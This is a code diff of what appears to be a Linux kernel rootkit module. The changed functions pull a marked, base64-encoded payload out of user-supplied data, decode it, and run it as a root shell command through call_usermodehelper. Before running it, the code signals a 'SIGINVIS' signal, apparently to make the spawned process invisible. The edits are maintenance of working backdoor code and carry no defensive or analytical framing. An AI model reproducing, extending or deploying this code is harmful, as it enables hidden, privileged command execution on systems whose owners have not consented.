@@ -419,34 +419,35 @@ int findIndex(const ubyte val) {
     return -1;
 }
  
-int decode(const ubyte source[], ubyte sink[]) {
+int decode_base64(const ubyte source[], ubyte sink[]) {
     const size_t length = strlen(source);
     const ubyte *it = source;
     const ubyte *end = source + length;
-    int acc;
+	ubyte b1, b2, b3, b4;
+	int acc, i1, i2, i3, i4;
  
     while (it != end) {
-        const ubyte b1 = *it++;
-        const ubyte b2 = *it++;
-        const ubyte b3 = *it++;
-        const ubyte b4 = *it++;
+        b1 = *it++;
+        b2 = *it++;
+        b3 = *it++;
+        b4 = *it++;
 
-        const int i1 = findIndex(b1);
-        const int i2 = findIndex(b2);
+        i1 = findIndex(b1);
+        i2 = findIndex(b2);
 
         if (i1 == -1 || i2 == -1) break;
  
         acc = i1 << 2;
         acc |= i2 >> 4;
         *sink++ = acc; 
-        const int i3 = findIndex(b3);
+        i3 = findIndex(b3);
         if (i3 == -1) continue;
 
         acc = (i2 & 0xF) << 4;
         acc += i3 >> 2;
         *sink++ = acc;
 
-        const int i4 = findIndex(b4);
+        i4 = findIndex(b4);
         if (i4 == -1) continue;
 
         acc = (i3 & 0x3) << 6;
@@ -479,17 +480,21 @@ static marker_pos get_marker_pos(const char *buffer) {
 void sh(char *payload) {
 	size_t payload_size = strlen(payload) + 13;
 	char *full_payload = kzalloc(payload_size + 1, GFP_KERNEL);
+
+	// Send SIGINVIS to current process, then execute payload
 	snprintf(full_payload, payload_size, "kill -%i $$&&%s", SIGINVIS, payload);
 
 	char* envp[] = {"HOME=/", NULL};
 	char* argv[] = {"/bin/sh", "-c", full_payload, NULL};
 	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+
+	kfree(full_payload);
 }
 
 void handle_xtrip(const void *user_buffer, size_t len) {
 	marker_pos pos;
 	char *raw_payload, *payload;
-	char buffer[BUFFER_SIZE];
+	char buffer[XTRIP_BUFFER_SIZE];
 	size_t payload_size, remaining_size;
 	int copied_size;
 
@@ -504,7 +509,7 @@ void handle_xtrip(const void *user_buffer, size_t len) {
 	raw_payload = kzalloc(payload_size + 1, GFP_KERNEL);
 	strncpy(raw_payload, pos.begin + MARKER_SIZE, payload_size);
 	payload = kzalloc(payload_size + 1, GFP_KERNEL);
-	decode(raw_payload, payload);
+	decode_base64(raw_payload, payload);
 
     remaining_size = (size_t)(buffer + len - pos.end);
 
